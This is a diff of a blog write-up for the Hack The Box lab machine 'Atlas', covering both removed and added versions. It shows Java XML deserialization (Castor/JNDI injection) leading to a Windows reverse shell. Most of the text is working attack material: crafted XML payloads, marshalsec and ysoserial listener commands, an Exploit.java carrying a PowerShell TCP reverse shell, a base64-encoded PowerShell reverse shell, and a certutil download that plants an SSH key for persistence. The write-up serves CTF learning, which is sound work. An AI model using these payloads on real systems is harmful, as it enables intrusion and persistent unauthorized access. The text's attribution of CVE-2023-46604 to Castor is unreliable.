@@ -7,10 +7,9 @@ TocOpen: true
 tags:
   - blog
   - HTB
-lastmod: 2026-02-22T08:48:45.641Z
+  - java-xml-marshallers
+lastmod: 2026-02-23T14:19:12.739Z
 ---
-WW
-
 # Box Info
 
 Atlas is a Hard difficulty machine that demonstrates advanced exploitation techniques through Java deserialization vulnerabilities and .NET cryptographic analysis. The machine features a Spring Boot web application using the vulnerable Castor XML library for marshalling / un-marshalling operations, leading to remote code execution via Java RMI exploitation. Privilege escalation involves reverse engineering a .NET `WinSSHTerm` application, performing cryptographic analysis of AES-256-CBC encryption with PBKDF2-SHA1 key derivation, and recovering administrator credentials through password brute-forcing and dynamic debugging techniques.
@@ -19,7 +18,7 @@ Atlas is a Hard difficulty machine that demonstrates advanced exploitation techn
 
 # Recon 10.129.238.8
 
-### \[\[PORT & IP SCAN]]
+### PORT & IP SCAN
 
 The `nmap` reveal that the machine is that allows the ftp anonymous login ,and show the ,atlas-pilot-1.0.0-SNAPSHOT.jar , atlas\_generator.zip , and the 3389 show the DNS with ATLAS, and the 8080 is running the tomcat .  with the windows a stand-alone machine.
 
@@ -65,12 +64,16 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 15.78 seconds
 ```
 
-### \[\[FTP 21]]
+### FTP 21
 
-Try the `anonymous` : `anonymous` , and we
+The `nmap` scan reveals that Anonymous FTP login is enabled. Logging in with `anonymous:anonymous` grants access to two highly interesting files, which we immediately download for offline analysis:
+
+* `atlas-pilot-1.0.0-SNAPSHOT.jar`
+
+* `atlas_generator.zip`
 
 ```
-	anonymous : anonymous
+anonymous : anonymous
 ```
 
 ```shell
@@ -159,141 +162,14 @@ atlas-pilot-1.0.0-SNAPSHOT.jar  gradle        gradlew.bat  mvnw.cmd  pom.xml    
 
 ### Web Recon 80
 
+Navigating to port 8080 reveals a web application with a file upload feature. Based on the UI and our downloaded files, this application processes XML templates to generate resumes.\
 ![Pasted image 20260214135507.png](/ob/Pasted%20image%2020260214135507.png)
-
-### \[\[WebSite Directory BurteForce]]
-
-```
-└─# feroxbuster -u http://10.129.238.8:8080/  -w ./spring-boot.txt 
-                                                                                                                                                                                             
- ___  ___  __   __     __      __         __   ___
-|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
-|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
-by Ben "epi" Risher 🤓                 ver: 2.13.1
-───────────────────────────┬──────────────────────
- 🎯  Target Url            │ http://10.129.238.8:8080/
- 🚩  In-Scope Url          │ 10.129.238.8
- 🚀  Threads               │ 50
- 📖  Wordlist              │ ./spring-boot.txt
- 👌  Status Codes          │ All Status Codes!
- 💥  Timeout (secs)        │ 7
- 🦡  User-Agent            │ feroxbuster/2.13.1
- 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
- 🔎  Extract Links         │ true
- 🏁  HTTP methods          │ [GET]
- 🔃  Recursion Depth       │ 4
-───────────────────────────┴──────────────────────
- 🏁  Press [ENTER] to use the Scan Management Menu™
-──────────────────────────────────────────────────
-404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-200      GET      508l     1817w   141912c http://10.129.238.8:8080/e43471533678310ee5007162c051d5eb.png
-200      GET      703l     4222w   342578c http://10.129.238.8:8080/rocket.png
-200      GET      103l      159w     1634c http://10.129.238.8:8080/
-[####################] - 6s       118/118     0s      found:0       errors:0      
-[####################] - 6s       113/113     19/s    http://10.129.238.8:8080/                                                                                                                                                                                                                                                                                                           
-┌──(root㉿kali)-[~/Desktop/HTB/Altas]
-└─# 
-```
-
-### \[\[Exploit-CVE]]  & \[\[Default 404 Pages]]
-
-Hide the version\
-![Pasted image 20260214135656.png](/ob/Pasted%20image%2020260214135656.png)
 
 ### XML File upload observer
 
-### ftp
+Unzipping `atlas_generator.zip` reveals the source code for a Spring Boot application. Digging into the directory structure (`src/main/java/com/example/uploadingfiles/`), we locate the `FileUploadController.java` file.
 
-zip source code review\
-![Pasted image 20260214140546.png](/ob/Pasted%20image%2020260214140546.png)
-
-observe the java file , to think out
-
-pom.xml\
-https://maven.apache.org/guides/introduction/introduction-to-the-pom.html\
-![Pasted image 20260214140820.png](/ob/Pasted%20image%2020260214140820.png)
-
-***
-
-```
-wget https://gist.githubusercontent.com/djangofan/3186223/raw/ee3840f937e745d5683b046a85cc4a0337e18428/test.xml 
-```
-
-```
-at FileUploadController.java
-package com.example.uploadingfiles;
-
-import java.io.IOException;
-import java.util.stream.Collectors;
-
-import org.springframework.beans.factory.annotation.Autowired;
-import org.springframework.core.io.Resource;
-import org.springframework.http.HttpHeaders;
-import org.springframework.http.ResponseEntity;
-import org.springframework.stereotype.Controller;
-import org.springframework.ui.Model;
-import org.springframework.web.bind.annotation.ExceptionHandler;
-import org.springframework.web.bind.annotation.GetMapping;
-import org.springframework.web.bind.annotation.PathVariable;
-import org.springframework.web.bind.annotation.PostMapping;
-import org.springframework.web.bind.annotation.RequestParam;
-import org.springframework.web.bind.annotation.ResponseBody;
-import org.springframework.web.multipart.MultipartFile;
-import org.springframework.web.servlet.mvc.method.annotation.MvcUriComponentsBuilder;
-import org.springframework.web.servlet.mvc.support.RedirectAttributes;
-import com.example.uploadingfiles.Client;
-import com.example.uploadingfiles.Employee;
-
-@Controller
-public class FileUploadController {
-
-
-        @GetMapping("/")
-        public String listUploadedFiles(Model model) throws IOException {
-
-                return "uploadForm";
-        }
-
-        @GetMapping("/generateTemplate")
-        public String writeMarshall(Model model) throws IOException {
-                model.addAttribute("message", Client.createXML());
-                return "xmlTemplate";
-        }
-
-
-        @PostMapping("/")
-        public String handleFileUpload(@RequestParam("file") MultipartFile file,
-                        RedirectAttributes redirectAttributes, Model model) {
-
-                try {
-                        Employee person = Client.parseXML(file.getInputStream());
-                        model.addAttribute("name", person.getName());
-                        model.addAttribute("id", person.getId());
-                        model.addAttribute("email", person.getEmail());
-                        model.addAttribute("phone", person.getPhone());
-                        model.addAttribute("profile", person.getProfile());
-                        model.addAttribute("title", person.getTitle());
-                        model.addAttribute("skills", person.getSkills());
-                        model.addAttribute("educationTitle", person.getEducationTitle());
-                        model.addAttribute("educationText", person.getEducationText());
-                        model.addAttribute("talentTitle1", person.getTalentTitles()[0]);
-                        model.addAttribute("talentTitle2", person.getTalentTitles()[1]);
-                        model.addAttribute("talentTitle3", person.getTalentTitles()[2]);
-                        model.addAttribute("talentText1", person.getTalentTextes()[0]);
-                        model.addAttribute("talentText2", person.getTalentTextes()[1]);
-                        model.addAttribute("talentText3", person.getTalentTextes()[2]);
-                        model.addAttribute("message", person.getMessage());
-
-                } catch (Exception e) {
-                        e.printStackTrace();
-                }
-
-                return "srt-resume";
-        }
-
-}
-
-```
+Reviewing the code reveals how the application handles the uploaded XML files. It uses the **Castor XML library** to unmarshal (deserialize) the incoming XML data into Java objects.
 
 ![Pasted image 20260214142239.png](/ob/Pasted%20image%2020260214142239.png)
 
@@ -305,210 +181,205 @@ public class FileUploadController {
 
 ![Pasted image 20260214142637.png](/ob/Pasted%20image%2020260214142637.png)
 
-Reference for  marshallers unmarshaller  https://blog.csdn.net/qq496013218/article/details/74204782
+### Source Review
+
+After the xml download , we can modify the template , and use the java to generate the new payload to point our 1099 rmi by using the marshal exploit
+
+They use the marshal to do the xml to java that may allow a remote attacker with network access to either a Java-based OpenWire broker or client to run arbitrary shell commands by manipulating serialized class types in the OpenWire protocol to cause either the client or the broker (respectively) to instantiate any class on the classpath
+
+Because the unmarshalling process is not strictly validated, it is vulnerable to **Java Deserialization**. Specifically, we can craft an XML payload that forces the Spring application to instantiate a `PropertyPathFactoryBean`. This allows us to perform a **JNDI Injection** attack by forcing the server to look up an object on an external, attacker-controlled RMI registry.
+
+Reference for marshallers unmarshaller  https://blog.csdn.net/qq496013218/article/details/74204782
+
+Reference for marshallers exploit https://www.tenable.com/cve/CVE-2023-46604
 
 poc github : https://github.com/mbechler/marshalsec
 
 ![Pasted image 20260214143130.png](/ob/Pasted%20image%2020260214143130.png)
 
+![Pasted image 20260223143030.png](/ob/Pasted%20image%2020260223143030.png)
+
 ***
 
-```
-┌──(root㉿kali)-[~/Desktop/HTB/Altas]
-└─# vim Dockerfile        
-                                                                                                                                                                                                                                            
-┌──(root㉿kali)-[~/Desktop/HTB/Altas]
-└─# cat Dockerfile 
-FROM maven:3.9.9-eclipse-temurin-8
+# Shell as john
 
-WORKDIR /opt/marshalsec
-
-# 移除網址前後的 < > 
-RUN git clone https://github.com/mbechler/marshalsec.git .
-
-RUN mvn clean package -DskipTests
-
-```
-
-```
-sudo docker build -t marshalsec-java8 .
-```
-
-![Pasted image 20260214153200.png](/ob/Pasted%20image%2020260214153200.png)
-
-```
-sudo docker run -it --rm -p 1389:1389 marshalsec-java8 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Castor
-```
-
-![Pasted image 20260214153420.png](/ob/Pasted%20image%2020260214153420.png)
-
-```
-No gadget type specified, available are [SpringAbstractBeanFactoryPointcutAdvisor, C3P0WrapperConnPool]
-```
-
-```
-sudo docker run -it --rm -p 1389:1389 marshalsec-java8 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.14.17:8000/#Exploit"
-```
-
-Create the exploit XML
-
-`Exploit.java`
-
-```
-public class Exploit {
-    public Exploit() {}
-    
-    static {
-        try {
-            // 將 PowerShell 的指令主體獨立出來，避免引號跳脫混亂
-            String payload = "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.17',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}";
-            
-            // 使用陣列形式，讓 Java 精準識別執行檔與各個參數
-            String[] cmd = {
-                "powershell", 
-                "-NoP", 
-                "-NonI", 
-                "-W", "Hidden", 
-                "-Exec", "Bypass", 
-                "-Command", payload
-            };
-            
-            java.lang.Runtime.getRuntime().exec(cmd);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-    
-    // 加入 main 方法方便本機除錯測試 (非必要，但建議保留)
-    public static void main(String[] args) {
-        Exploit e = new Exploit();
-    }
-}
-```
-
-請在您存放 `Exploit.java` 的目錄下，直接執行以下這行 Docker 指令。它會啟動一個臨時容器，把您當前的目錄掛載進去，編譯完畢後自動銷毀容器，不留痕跡：
-
-```
-sudo docker run --rm -v $(pwd):/app -w /app marshalsec-java8 javac -source 1.8 -target 1.8 Exploit.java
-```
-
-### java marshallers deserialization
+### Setting up ysoserial
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "java\_xml\_marshallers\_deserialization" >}} In the source code review , found the marshallers package which is used for the deserializing XML data into newly created Java content trees , so we abuse the marshallers of deserialization for the xml upload function to ping myself as the POC , Finally the RCE
+{{< tag "java-xml-marshallers" >}} The web has the xml file upload function , and after check the source code knew the website used the unmarshallers java module to handle the xml which is the old version that is the CVE-2023-46604 (you can check the source code without source code to try it ), we can exploit it by used the ysoserial in docker to ping back us as the POC . Finally to use the base64 powershell to have the RCE
 
 {{< /toggle >}}
 
-Step 1 build the docker for marshalsec\
-Use the https://github.com/mbechler/marshalsec as the docker to run for avoiding the env setting problem
+![Pasted image 20260214135507.png](/ob/Pasted%20image%2020260214135507.png)
+
+java marshallers deserialization
+
+To exploit this, we need to stand up a malicious RMI registry and deliver a payload that executes commands on the target.
+
+To avoid cluttering the local host's Java environment, `ysoserial` is run via a Docker container. We bind port `1099` (the default RMI port) to the container.
 
 ```
-┌──(root㉿kali)-[~/Desktop/HTB/Altas]
-└─# vim Dockerfile        
-                                                                                                                                                                                                                                            
-┌──(root㉿kali)-[~/Desktop/HTB/Altas]
-└─# cat Dockerfile 
 FROM maven:3.9.9-eclipse-temurin-8
 
-WORKDIR /opt/marshalsec
+WORKDIR /opt/ysoserial
 
-# 移除網址前後的 < > 
-RUN git clone https://github.com/mbechler/marshalsec.git .
+RUN git clone https://github.com/frohoff/ysoserial.git .
 
-RUN mvn clean package -DskipTests
+RUN mvn -q -DskipTests package
 
+ENTRYPOINT ["bash"]
 ```
 
 ```
-sudo docker build -t marshalsec-java8 .
-```
+# Start the ysoserial Docker container
+sudo docker run -it --rm -p 1099:1099 ysoserial-java8
 
-![Pasted image 20260214153200.png](/ob/Pasted%20image%2020260214153200.png)
-
-step 2 define a LDAP server for
-
-```
-sudo docker run -it --rm -p 1389:1389 marshalsec-java8 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Castor SpringAbstractBeanFactoryPointcutAdvisor ldap://10.10.14.17:1389/a
-```
-
-which will give the payload
-
-```
-<x xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:java="http://java.sun.com" xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean"><target-bean-name>ldap://10.10.14.17:1389/a</target-bean-name><property-path>foo</property-path><bean-factory xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory"><shareable-resource>ldap://10.10.14.17:1389/a</shareable-resource></bean-factory></x>
-                                                                                              
-```
-
-![Pasted image 20260214160551.png](/ob/Pasted%20image%2020260214160551.png)
-
-we also start a malicious JNDI / LDAP server via marschalsec
-
-```
-sudo docker run -it --rm -p 1389:1389 marshalsec-java8 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.14.17:8888/#Exploit"
-```
-
-create the `Exploit.java`
-
-```
-public class Exploit {
-    public Exploit() {}
-    
-    static {
-        try {
-            // 將 PowerShell 的指令主體獨立出來，避免引號跳脫混亂
-            String payload = "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.17',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}";
-            
-            // 使用陣列形式，讓 Java 精準識別執行檔與各個參數
-            String[] cmd = {
-                "powershell", 
-                "-NoP", 
-                "-NonI", 
-                "-W", "Hidden", 
-                "-Exec", "Bypass", 
-                "-Command", payload
-            };
-            
-            java.lang.Runtime.getRuntime().exec(cmd);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-    
-    // 加入 main 方法方便本機除錯測試 (非必要，但建議保留)
-    public static void main(String[] args) {
-        Exploit e = new Exploit();
-    }
-}
-
+# Start the JRMPListener hosting the CommonsBeanutils1 payload
+java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'ping 10.10.14.11'
 ```
 
 ```
-sudo docker run --rm -v $(pwd):/app -w /app marshalsec-java8 javac -source 1.8 -target 1.8 Exploit.java
+sudo docker run -it --rm  -p 1099:1099 ysoserial-java8
+```
+
+*Note: We initially use a `ping` command and monitor with `sudo tcpdump -i tun0 icmp` to confirm code execution.*
+
+```
+sudo tcpdump -i tun0 icmp 
 ```
 
 ***
 
-我們會用 RMI 方案重新生成 SSRF 有效載荷，並在生成的範本中重新替換。
+### Crafting the Malicious XML
+
+upload the xml to web , and remark rmi://10.10.14.11/a , `rmi` already is the  port 1099 , so we dont need special say to rmi://10.10.14.11:1099/a , and open the burpsuite to easily send to repester to send again
+
+We modify a valid XML resume template to include our JNDI injection payload. We set the `target-bean-name` and `shareable-resource` to point to our malicious RMI registry (`rmi://10.10.14.11/a`).
 
 ```
-sudo docker run -it --rm -p 1389:1389 marshalsec-java8 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Castor SpringAbstractBeanFactoryPointcutAdvisor rmi://10.10.14.17/a
+<?xml version="1.0" encoding="UTF-8"?>
+
+<Employee id="101"><name xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:java="http://java.sun.com" xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean"><target-bean-name>rmi://10.10.14.11/a</target-bean-name><property-path>foo</property-path><bean-factory xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory"><shareable-resource>rmi://10.10.14.11/a</shareable-resource></bean-factory></name><talent-titles>Navigation</talent-titles><talent-titles>Warp Engine</talent-titles><talent-titles>Project Direction</talent-titles><talent-textes>Assertively exploit wireless initiatives rather than synergistic core competencies.</talent-textes><talent-textes>Credibly streamline mission-critical value with multifunctional functionalities.</talent-textes><talent-textes>Proven ability to lead and manage a wide variety of design and development projects in team and independent situations.</talent-textes><skills>Mining</skills><skills>Ship Building</skills><skills>Gravity Science</skills><skills>Alien Communication</skills><skills>Planetology</skills><skills>Zero Trust Tools</skills><skills>Satellite Engineering</skills><skills>Rocket Science</skills><skills>Moon Walks</skills><profile>Progressively evolve cross-platform ideas before impactful infomediaries. Energistically visualize tactical initiatives before cross-media catalysts for change.</profile><phone>(313) - 867-5309</phone><email>jonathan@starfield.com</email><education-text>Dual Major, Robotics and Starships - 4.0 GPA</education-text><education-title>NASA University - Bloomington, Indiana</education-title><title>ROCKET TESTER, PILOT</title></Employee>
+```
+
+![Pasted image 20260223140237.png](/ob/Pasted%20image%2020260223140237.png)
+
+![Pasted image 20260223140212.png](/ob/Pasted%20image%2020260223140212.png)
+
+![Pasted image 20260223140757.png](/ob/Pasted%20image%2020260223140757.png)
+
+### RCE
+
+After confirming execution via ICMP, we swap the `ping` command in our `ysoserial` listener for a Base64-encoded PowerShell reverse shell. Using Base64 prevents any bad character or parsing issues during execution.
+
+![Pasted image 20260223140952.png](/ob/Pasted%20image%2020260223140952.png)
+
+```
+root@aaa47bf7ca7c:/opt/ysoserial# java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAxACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
+```
+
+Catching the connection on our Netcat listener, we successfully gain a reverse shell as the user `john`.\
+![Pasted image 20260223141248.png](/ob/Pasted%20image%2020260223141248.png)
+
+### Setting Up Persistent Access
+
+```
+└─#  ssh-keygen -t ed25519 -C "tester@kali-$(date +%Y%m%d)"
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/root/.ssh/id_ed25519): 
+/root/.ssh/id_ed25519 already exists.
+Overwrite (y/n)? y
+Enter passphrase for "/root/.ssh/id_ed25519" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_ed25519
+Your public key has been saved in /root/.ssh/id_ed25519.pub
+The key fingerprint is:
+SHA256:PHUJ6pmgSR0gQGRBJ6SZzbyiR3yTrqHgtSN8OSiQpDg tester@kali-20260223
+The key's randomart image is:
++--[ED25519 256]--+
+|*Xo....   .      |
+|o*o. . . . . .   |
+|+ + . o . . o    |
+| o o + + + .     |
+|=.+ *   S        |
+|Eo o .   .       |
+|=.+.o            |
+|+*.B.            |
+|o.+.o            |
++----[SHA256]-----+
+                                                                                                                                                                                                                                            
+┌──(root㉿kali)-[~/Desktop/HTB/Altas]
+└─# cd ~/.ssh/      
+                                                                                                                                                                                                                                            
+┌──(root㉿kali)-[~/.ssh]
+└─# sudo python3 -m http.server 80                           
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+
 ```
 
 ```
-<x xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:java="http://java.sun.com" xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean"><target-bean-name>rmi://10.10.14.17/a</target-bean-name><property-path>foo</property-path><bean-factory xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory"><shareable-resource>rmi://10.10.14.17/a</shareable-resource></bean-factory></x>
+PS C:\Users\John> mkdir C:\Users\John\.ssh
+
+
+    Directory: C:\Users\John
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----        23/02/2026     13:32                .ssh                                                                 
+
+
+PS C:\Users\John> cd .ssh
+PS C:\Users\John\.ssh> certutil -urlcache -split -f http://10.10.14.11:80/id_ed25519.pub C:\Users\John\.ssh\authorized_keys
+****  Online  ****
+  0000  ...
+  0066
+CertUtil: -URLCache command completed successfully.
+
 
 ```
 
 ```
-java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'ping 10.10.17.46'
-* Opening JRMP listener on 1099
+ssh -i ~/.ssh/id_ed25519  john@10.129.238.8
 ```
 
 ***
 
-try more one
+### Finding WinSSHTerm Credentials
+
+Digging through John's files, we find WinSSHTerm (an SSH client) in the Downloads folder:
 
 ```
-<x xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:java="http://java.sun.com" xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean"><target-bean-name>ldap://10.10.14.17:1389</target-bean-name><property-path>foo</property-path><bean-factory xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory"><shareable-resource>ldap://10.10.14.17:1389</shareable-resource></bean-factory></x>
+john@ATLAS C:\Users\John\Downloads>tree /f WinSSHTerm        
+Folder PATH listing
+Volume serial number is 00000099 C6FD:5949
+C:\USERS\JOHN\DOWNLOADS\WINSSHTERM
+│   README.txt
+│   WinSSHTerm.exe
+│
+├───config
+│       connections.xml
+│       key
+│       layout.xml
+│       preferences.xml
+│
+└───tools
 
+john@ATLAS C:\Users\John\Downloads>
+
+```
+
+**`connections.xml`** reveals a saved connection:
+
+The administrator's SSH password is right there -- encrypted. Time for some reverse engineering.
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<WinSSHTerm Version="1" VerifyKey="j6JcYjnkh7coSbefT7+8jHI+49cgPWAt4XHQ76M6Op0jEzaa+QxpxEk4T9ci9P8wLgORRde5KSb3TmT05AnfWQ==">
+    <Node Name="Admin SSH" Type="Connection" Descr="" Username="administrator" Password="VmgFP/ooNadVdVQI5UmW3e5dISTQG8+fQ+wMJHtaATFI46G73XREnctiYbOdPYNR" PrivateKey="" Hostname="127.0.0.1" Port="22" CustomPath="" LoginCmds="" CmdLineAr
+gs="" EnvCol="" CustomId="" cfProt="" cfLogFile="" cfLogLevel="" sAgentFwd="" sTermType="" sLogType="" sLogFileName="" sTCP="" sX11="" sSb="" sCS="" sCSHR="" pSshProxy="disabled" pType="Jump Server" pHost="" pPort="22" pUser="" pPasswor
+d="" pPrivKey="" />
+</WinSSHTerm>
 ```
